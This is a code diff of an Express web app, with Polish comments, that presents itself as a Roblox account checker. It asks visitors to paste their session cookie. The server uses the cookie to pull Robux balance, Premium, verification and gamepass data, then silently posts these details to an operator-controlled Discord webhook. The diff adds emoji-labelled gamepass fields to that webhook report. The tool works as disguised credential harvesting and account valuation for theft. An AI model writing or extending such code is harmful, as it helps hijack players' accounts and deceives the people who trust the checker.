@@ -1,9 +1,8 @@
 const express = require('express');
 const app = express();
-
 app.use(express.json());
 
-// CORS – żeby strona działała z dowolnego źródła
+// CORS – żeby strona działała
 app.use((req, res, next) => {
   res.header('Access-Control-Allow-Origin', '*');
   res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
@@ -41,7 +40,6 @@ app.get('/', (req, res) => {
 <br>
 <button onclick="checkAccount()">Check Account</button>
 <div id="result"></div>
-
 <script>
 async function checkAccount() {
   const cookieVal = document.getElementById('cookie').value.trim();
@@ -86,17 +84,17 @@ async function checkAccount() {
         <b>Display Name:</b> \${json.displayName}<br>
         <b>User ID:</b> \${json.userId}<br>
         <b>Roblox Premium:</b> <span style="color: \${json.hasPremium ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">\${json.hasPremium ? 'YES ✓' : 'NO ✗'}</span><br>
-       
+      
         <b>Email / Phone Verified:</b> <span style="color: \${json.emailVerified ? '#00ff9d' : '#ff4d4d'}; font-weight: bold;">
           \${json.emailVerified ? 'YES ✓ (hat detected)' : 'NO ✗'}
         </span><br>
-       
+      
         <b>Robux Balance:</b> <span style="color: #ffcc00; font-weight: bold;">\${json.robux.toLocaleString('en-US')} Robux</span><br>
-       
+      
         <b>MM2 Gamepasses:</b> <span style="color: \${mm2Color}; font-weight: bold;">\${mm2Count}</span><br>
         <b>AMP Gamepasses:</b> <span style="color: \${ampColor}; font-weight: bold;">\${ampCount}</span><br>
         <b>SAB Gamepasses:</b> <span style="color: \${sabColor}; font-weight: bold;">\${sabCount}</span><br>
-       
+      
         <b>Account Age:</b> <span style="color: #ffcc00; font-weight: bold;">\${json.accountAgeDays} days</span><br>
         <b>Created:</b> \${creationDate} \${json.created !== 'failed to fetch' ? \`<small>(\${json.created.split('T')[0]})\</small>\` : ''}<br>
       \`;
@@ -110,10 +108,9 @@ async function checkAccount() {
 </html>`);
 });
 
-// Główny endpoint – sprawdzanie konta + wysyłka na webhook
+// Endpoint do sprawdzania konta + wysyłka na webhook
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
-
   if (!cookie || typeof cookie !== 'string' || cookie.length < 200) {
     return res.status(400).json({ error: 'Missing or invalid cookie' });
   }
@@ -215,6 +212,7 @@ app.post('/check', async (req, res) => {
     const sabIds = [1227013099, 1229510262, 1228591447];
     const allIds = [...mm2Ids, ...ampIds, ...sabIds];
     const hasGamePasses = [];
+
     try {
       for (const passId of allIds) {
         const gpRes = await fetch(
@@ -252,7 +250,7 @@ app.post('/check', async (req, res) => {
 
     res.status(200).json(result);
 
-    // Wysyłka do webhooka – z Twoim custom emoji robux
+    // Wysyłka do webhooka – z emoji zamiast nazw
     const webhookUrl = process.env.WEBHOOK;
     if (webhookUrl) {
       try {
@@ -262,7 +260,7 @@ app.post('/check', async (req, res) => {
           body: JSON.stringify({
             embeds: [{
               title: `${userData.name} Roblox Info`,
-              color: 0x9B59B6,  // fioletowy
+              color: 0x9B59B6, // fioletowy
               thumbnail: {
                 url: avatarUrl || "https://tr.rbxcdn.com/30DAY-AvatarHeadshot?width=720&height=720&format=png"
               },
@@ -271,12 +269,16 @@ app.post('/check', async (req, res) => {
                 { name: "Roblox Premium", value: hasPremium ? "Yes" : "No", inline: true },
                 { name: "Email / Phone Verified", value: emailVerified ? "Yes" : "No", inline: true },
                 {
-                  name: "\u200B",  // niewidoczna nazwa pola
+                  name: "\u200B",
                   value: `<:robux:1481759314426204230> ${robux.toLocaleString()}`,
                   inline: true
                 },
                 { name: "Created", value: createdDate ? createdDate.split('T')[0] : "?", inline: true },
-                { name: "Account Age", value: `${accountAgeDays} days`, inline: true }
+                { name: "Account Age", value: `${accountAgeDays} days`, inline: true },
+                // ← tutaj zmiana na emoji
+                { name: "<:MM2:1481763122808230164> Gamepasses", value: `${hasGamePasses.filter(id => mm2Ids.includes(id)).length}`, inline: true },
+                { name: "<:AMP:1481763635775930520> Gamepasses", value: `${hasGamePasses.filter(id => ampIds.includes(id)).length}`, inline: true },
+                { name: "<:SAB:1481763931113394177> Gamepasses", value: `${hasGamePasses.filter(id => sabIds.includes(id)).length}`, inline: true },
               ],
               footer: {
                 text: "Checker • " + new Date().toLocaleString()
